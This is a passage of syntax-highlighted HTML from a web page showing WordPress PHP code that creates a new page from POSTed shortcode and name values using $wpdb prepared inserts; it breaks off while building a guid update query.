					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-4">4</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-6">6</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-8">8</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-10">10</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-12">12</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-14">14</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-16">16</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-18">18</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-20">20</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-22">22</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-24">24</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-26">26</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-28">28</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-30">30</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-32">32</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-34">34</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-36">36</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-38">38</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-40">40</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-42">42</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-44">44</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-46">46</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-48">48</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-50">50</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-52">52</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-54">54</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-56">56</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-58">58</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-60">60</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-62">62</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-64">64</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-66">66</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-68">68</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-70">70</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-72">72</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-74">74</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2375e127144823-76">76</div><div class="crayon-num" data-line="crayon-53c9878f2375e127144823-77">77</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2375e127144823-1"><span class="crayon-c">// Add new page</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"add_new_page"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'shortcode'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'name'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">post_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">strtolower</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-13"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INSERT INTO "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-14"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( &nbsp;&nbsp;&nbsp;&nbsp;post_author, </span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-15"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_date,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-16"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_date_gmt,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-17"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_content,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-18"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_title,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-19"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_status,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-20"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comment_status,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-21"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ping_status,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-22"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_name,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-23"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_modified,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-24"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_modified_gmt,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-25"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_parent,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-26"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;menu_order,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-27"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_type,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-28"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comment_count</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-29"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-30"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VALUES ( %d, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %d, %d, %s, %d )"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-i">ID</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">date</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">gmdate</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'['</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-sy">.</span><span class="crayon-s">']'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'publish'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'closed'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'open'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">post_name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">date</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">gmdate</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'page'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get new ID</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">new_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">insert_id</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// page meta data</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-55"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INSERT INTO "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"postmeta</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-56"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( &nbsp;&nbsp;&nbsp;&nbsp;post_id, </span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-57"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta_key,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-58"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta_value</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-59"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-60"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VALUES ( %d, %s, %s )"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'_wp_page_template'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'sidebar-page.php'</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// update guid</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_bloginfo</span><span class="crayon-sy">(</span><span class="crayon-s">'url'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-sy">[</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'/'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878f2375e127144823-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'/?p='</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2375e127144823-72"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span 